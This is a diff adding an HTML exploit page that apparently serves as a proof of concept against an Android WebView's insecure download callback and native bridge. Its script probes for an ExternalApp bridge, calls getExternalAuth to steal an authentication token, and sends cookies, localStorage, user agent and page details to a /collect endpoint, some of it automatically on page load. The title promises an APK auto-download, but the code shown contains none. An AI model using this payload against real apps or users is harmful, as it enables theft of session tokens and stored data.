@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>3.1.2_Insecure_Download_Callback - Auto Download Exploit</title>
+<style>
+body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #e0e0e0; max-width: 800px; margin: 50px auto; padding: 20px; }
+.card { background: #16213e; border: 1px solid #0f3460; border-radius: 12px; padding: 24px; margin: 16px 0; }
+.success { color: #4caf50; } .fail { color: #f44336; }
+pre { background: #0d1117; padding: 12px; border-radius: 8px; font-size: 13px; overflow-x: auto; }
+h2 { color: #e94560; }
+button { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin: 4px; }
+</style>
+</head>
+<body>
+<h1>3.1.2_Insecure_Download_Callback - Auto Download Exploit</h1>
+<p><b>Vulnerability:</b> DownloadListener auto-downloads APKs without domain check</p>
+<p><b>Exploit:</b> Trigger .apk download to install malicious app</p>
+<div class="card">
+<h2>Bridge Detection</h2>
+<p>ExternalApp bridge: <span id="bs">Checking...</span></p>
+<div id="bp" style="display:none;">
+<button onclick="stealToken()">Steal Token via ExternalApp Bridge</button>
+<pre id="br"></pre>
+</div>
+</div>
+<div class="card">
+<h2>Data Exfiltration</h2>
+<button onclick="exfil('cookies',document.cookie||'(empty)')">Exfiltrate Cookies</button>
+<button onclick="exfilLS()">Exfiltrate localStorage</button>
+<button onclick="exfil('ua',navigator.userAgent)">Exfiltrate UA</button>
+<pre id="er"></pre>
+</div>
+<script>
+var C=location.origin+'/collect';
+function cb(){try{if(window.ExternalApp&&typeof window.ExternalApp.getExternalAuth==='function'){document.getElementById('bs').innerHTML='<span class=success>Available</span>';document.getElementById('bp').style.display='block'}else{document.getElementById('bs').innerHTML='<span class=fail>Not available</span>'}}catch(e){document.getElementById('bs').innerHTML='<span class=fail>Error: '+e.message}}
+function stealToken(){try{window.ExternalApp.getExternalAuth({callback:function(d){document.getElementById('br').textContent='Token: '+JSON.stringify(d,null,2);exfil('token',d)}});document.getElementById('br').textContent='Called...'}catch(e){document.getElementById('br').textContent='Error: '+e.message}}
+function exfil(label,data){var p=label+': '+JSON.stringify(data);fetch(C,{method:'POST',mode:'cors',body:p}).catch(function(){new Image().src=C+'?d='+encodeURIComponent(p)});document.getElementById('er').textContent='Sent: '+p.substring(0,200)}
+function exfilLS(){var d={};try{for(var i=0;i<localStorage.length;i++)d[localStorage.key(i)]=localStorage.getItem(localStorage.key(i))}catch(e){}exfil('localStorage',d)}
+cb();setTimeout(function(){exfil('page',{url:location.href,title:document.title,time:new Date().toISOString()})},1000);
+</script>
+</body>
+</html>
